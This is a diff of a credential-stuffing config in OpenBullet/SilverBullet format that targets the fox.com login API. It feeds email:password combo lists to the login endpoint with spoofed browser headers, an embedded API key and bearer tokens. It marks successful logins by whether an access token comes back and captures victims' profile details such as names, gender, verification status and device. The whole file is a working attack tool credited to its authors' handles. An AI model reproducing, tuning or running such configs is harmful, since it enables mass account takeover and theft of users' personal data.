@@ -1,12 +1,12 @@
 [SETTINGS]
 {
   "Name": "fox.com",
-  "SuggestedBots": 150,
+  "SuggestedBots": 100,
   "MaxCPM": 0,
-  "LastModified": "2022-02-27T12:10:59.5404423+00:00",
+  "LastModified": "2021-12-23T18:45:46.0387598+02:00",
   "AdditionalInfo": "",
   "RequiredPlugins": [],
-  "Author": "",
+  "Author": "@uzzzul",
   "Version": "1.1.2 [SB]",
   "SaveEmptyCaptures": false,
   "ContinueOnCustom": false,
@@ -21,7 +21,7 @@
   "BanLoopEvasionOverride": -1,
   "EncodeData": false,
   "AllowedWordlist1": "MailPass",
-  "AllowedWordlist2": "",
+  "AllowedWordlist2": "MailPass",
   "DataRules": [],
   "CustomInputs": [],
   "CaptchaUrl": "",
@@ -62,37 +62,51 @@
 }
 
 [SCRIPT]
-REQUEST POST " https://api3.fox.com/v2.0/login" 
+#login REQUEST POST "https://api3.fox.com/v2.0/login" 
   CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
   CONTENTTYPE "application/json" 
-  HEADER "Host: api3.fox.com" 
-  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
-  HEADER "Accept: */*" 
-  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
-  HEADER "Accept-Encoding: gzip, deflate, br" 
-  HEADER "Referer: https://www.fox.com/" 
-  HEADER "Content-Type: application/json" 
-  HEADER "X-Api-Key: 6E9S4bmcoNnZwVLOHywOv8PJEdu76cM9" 
-  HEADER "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ijg5REEwNkVEMjAxOCIsInR5cCI6IkpXVCJ9.eyJwaWQiOiJ3ZWI4YzhmMTNhNS0wNWNmLTRlZDYtYjE4Ny0yMDQwMzllMWFmMjgiLCJ1aWQiOiJkMlZpT0dNNFpqRXpZVFV0TURWalppMDBaV1EyTFdJeE9EY3RNakEwTURNNVpURmhaakk0Iiwic2lkIjoiODg5NWNlZTgtMzE2ZC00M2Q1LWFmOTUtMWZiNjllZjUwZDBmIiwic2RjIjoidXMtZWFzdC0xIiwiYXR5cGUiOiJhbm9ueW1vdXMiLCJkdHlwZSI6IndlYiIsInV0eXBlIjoiZGV2aWNlSWQiLCJkaWQiOiI4YzhmMTNhNS0wNWNmLTRlZDYtYjE4Ny0yMDQwMzllMWFmMjgiLCJtdnBkaWQiOiIiLCJ2ZXIiOjIsImVudCI6e30sImV4cCI6MTY5MzI2NzAyNywianRpIjoiMTQ3MWE0MGEtZjM2NS00ZjYzLWJlMWYtNmNkMjQ2N2JkYmYzIiwiaWF0IjoxNjQ1OTYzMDI3fQ.a2WeqRAGP6dTSlQm8zjn3g2ovk4LgFJ48bLOMFwC2WSE0xkQixVFQLsjyq9zCHdJev7VGoEiHb8sp5x_mX_kO0_dUyUsN7o6wI_GosIQW_6ZXIqBFAvm52pFQdkTt1XGyf7M2z1eGfeHu6nj0T_aP8oMgGGy6GmWk7QJVPn511N00_xsH5JdK090rCmuL2844akjFoUrH3OQTdswRo3006LJJ_CjtZIVeUOolkeJvCDKtbn9zZiYqbAl3j2Ye0iGVSiHDHmyZfm1bcZuHByFiQevGTNdQGqGHNFa_pi7v4RNhCSVYb0xvJ9cvIsFnuJ4TPUJ0KW6PiJFuxOc-l9Q5g" 
-  HEADER "Origin: https://www.fox.com" 
-  HEADER "Content-Length: 55" 
-  HEADER "Connection: keep-alive" 
-  HEADER "Sec-Fetch-Dest: empty" 
-  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ijg5REEwNkVEMjAxOCIsInR5cCI6IkpXVCJ9.eyJwaWQiOiJ3ZWJiMzQ4ODk1MC1mZTMzLTQ5MzMtODFhYi03MDlmNjRjODA2M2QiLCJ1aWQiOiJkMlZpWWpNME9EZzVOVEF0Wm1Vek15MDBPVE16TFRneFlXSXROekE1WmpZMFl6Z3dOak5rIiwic2lkIjoiOTEzM2IzZTYtYWYzYy00ODBmLTk4OGItZGU4YjA4MmEzY2Y2Iiwic2RjIjoidXMtZWFzdC0xIiwiYXR5cGUiOiJhbm9ueW1vdXMiLCJkdHlwZSI6IndlYiIsInV0eXBlIjoiZGV2aWNlSWQiLCJkaWQiOiJiMzQ4ODk1MC1mZTMzLTQ5MzMtODFhYi03MDlmNjRjODA2M2QiLCJtdnBkaWQiOiIiLCJ2ZXIiOjIsImVudCI6e30sImV4cCI6MTY4NjU1ODA1OCwianRpIjoiYjA2ZjgxNmItOGM4OC00OWZhLTkzMTMtNTc1YmVkOGJkMTkzIiwiaWF0IjoxNjM5MjU0MDU4fQ.EmjBhdrFiFMeCg_ms7DEOK_JmioY780BLWrAR4kkLLwZMvqgly0Ip_-ogQPpmc8SxX8vjZd2_zx5r2Diji8NEKRfQDiY1eDekEGb1yCHKH7Ix1qTInEpmx3JQ_ve7F8dMikIpPdvXlXXYW-F6_RNsoqnyZbkgj64Bhj6HKd-cM4WlpNcBUWbXlKmbId5piKLfMd587fFQrjvL3mF_Z3T58_ydNV3MPD_IwIVxCOTxDSlMtf3LWVWffWupQm3ztodSyW8OMsdfz7HsYMkAI8hlrEXUh7Gbdj0l8A0wy9yg0CrQkb83QOGv0pmSncCMDdPS2hgmIoQP7-qUZc2wQZGIQ" 
+  HEADER "content-length: 57" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://www.fox.com" 
+  HEADER "referer: https://www.fox.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36" 
+  HEADER "x-api-key: 6E9S4bmcoNnZwVLOHywOv8PJEdu76cM9" 
 
 KEYCHECK 
   KEYCHAIN Failure OR 
+    KEY "401" 
     KEY "Invalid login credentials" 
+    KEY "Invalid LoginId" 
   KEYCHAIN Success OR 
     KEY "{\"accessToken\":\"" 
+    KEY "accessToken" 
 
-#First PARSE "<SOURCE>" LR "firstName\":\"" "\"" CreateEmpty=FALSE -> CAP "First_Name" 
+#accessToken PARSE "<SOURCE>" JSON "accessToken" -> VAR "accessToken" 
 
-#last PARSE "<SOURCE>" LR "lastName\":\"" "\"" CreateEmpty=FALSE -> CAP "Last_Name" 
+#isVerified PARSE "<SOURCE>" JSON "isVerified" CreateEmpty=FALSE -> CAP "isVerified" 
 
-#Verefied PARSE "<SOURCE>" LR "isVerified\":" "," CreateEmpty=FALSE -> CAP "Verefied" 
+#hasSocialLogin PARSE "<SOURCE>" JSON "hasSocialLogin" CreateEmpty=FALSE -> CAP "hasSocialLogin" 
 
-#Brand PARSE "<SOURCE>" LR "brand\":\"" "\"" CreateEmpty=FALSE -> CAP "Brand" 
+#firstName PARSE "<SOURCE>" JSON "firstName" CreateEmpty=FALSE -> CAP "firstName" 
 
-FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By" 
+#lastName PARSE "<SOURCE>" JSON "lastName" CreateEmpty=FALSE -> CAP "lastName" 
+
+#gender PARSE "<SOURCE>" JSON "gender" CreateEmpty=FALSE -> CAP "gender" 
+
+#platform PARSE "<SOURCE>" JSON "platform" CreateEmpty=FALSE -> CAP "platform" 
+
+#device PARSE "<SOURCE>" JSON "device" CreateEmpty=FALSE -> CAP "device" 
+
+#hasEmail PARSE "<SOURCE>" JSON "hasEmail" CreateEmpty=FALSE -> CAP "hasEmail" 
+
+#author FUNCTION Constant "@uzzzul" -> CAP "configby" 
 
